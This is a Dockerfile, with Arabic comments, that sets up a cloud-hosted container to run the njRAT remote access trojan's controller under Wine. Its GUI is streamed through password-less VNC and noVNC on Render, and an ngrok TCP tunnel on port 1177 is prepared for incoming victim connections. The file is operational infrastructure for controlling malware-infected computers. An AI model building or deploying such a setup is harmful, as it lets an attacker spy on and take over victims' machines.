FROM ubuntu:22.04

# منع التفاعل أثناء التثبيت لضمان عدم توقف البناء
ENV DEBIAN_FRONTEND=noninteractive

# تثبيت التحديثات وحزم الواجهة الرسومية وخادم noVNC وبيئة تشغيل تطبيقات ويندوز/الـ .NET
RUN apt-get update && apt-get install -y \
    xvfb \
    x11vnc \
    novnc \
    websockify \
    fluxbox \
    wine64 \
    mono-complete \
    curl \
    && rm -rf /var/lib/apt/lists/*

# تحميل أداة Ngrok لفتح منافذ الـ TCP مجاناً داخل الحاوية
RUN curl -s https://bin.equinox.io/c/bNyj1mQcaGS/ngrok-stable-linux-amd64.tgz | tar xz -C /usr/local/bin

WORKDIR /app

# نسخ جميع ملفات المشروع (بما فيها ملف الـ .exe) إلى الحاوية
COPY . /app

# Render يفرض فتح منفذ للويب، المنفذ الافتراضي هو 10000
EXPOSE 10000

# كتابة سكريبت الإقلاع لتشغيل النظام الرسومي والنفق والبرنامج معاً
RUN echo '#!/bin/bash\n\
# 1. تشغيل خادم العرض الافتراضي في الخلفية\n\
Xvfb :1 -screen 0 1024x768x16 &\n\
export DISPLAY=:1\n\
fluxbox &\n\
x11vnc -forever -shared -bg -nopw -display :1 &\n\
\n\
# 2. إعداد وتشغيل Ngrok لفتح نفق TCP (استبدل YOUR_AUTHTOKEN برمزك وحذف الـ #)\n\
# ngrok authtoken YOUR_AUTHTOKEN\n\
# ngrok tcp 1177 &\n\
\n\
# 3. تشغيل برنامج الـ .NET باستخدام محاكي Wine\n\
wine /app/njRAT v0.7d.exe &\n\
\n\
# 4. تشغيل خادم noVNC لبث الواجهة الرسومية على منفذ الويب الخاص بـ Render\n\
/usr/share/novnc/utils/launch.sh --vnc localhost:5900 --listen 10000\n\
' > /app/start.sh && chmod +x /app/start.sh

CMD ["/app/start.sh"]
